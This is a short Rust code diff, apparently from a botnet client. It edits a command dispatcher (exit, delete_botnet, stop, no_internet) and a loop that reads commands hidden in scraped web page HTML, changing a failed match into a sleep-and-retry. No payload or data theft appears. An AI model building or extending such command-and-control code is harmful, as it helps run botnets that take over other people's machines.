@@ -17,7 +17,7 @@ fn execute(_cmd: cmd::Command) {
         "exit" => funcs::exit(),
         "delete_botnet" => funcs::delete_botnet(),
         "stop" => funcs::nothing(),
-        "no_internet" => funcs::no_inet(),
+        "no_internet" => funcs::no_inet(), // WTF?
         _ => funcs::nothing(),
     }
 }
@@ -39,7 +39,10 @@ fn main() {
         let re = Regex::new(r"<p>(.*)</p></article>").unwrap();
         let content: &str = match re.captures(&html) {
             Some(res) => res.get(0).unwrap().as_str(),
-            None => "<p>no_internet{split}</p></article>"
+            None => {
+                thread::sleep(time::Duration::from_secs(config::DELAY));
+                continue;
+            },
         };
         // Get command form parsed trash string
         let _cmd = cmd::cmd(&content[3..content.len()-14]);
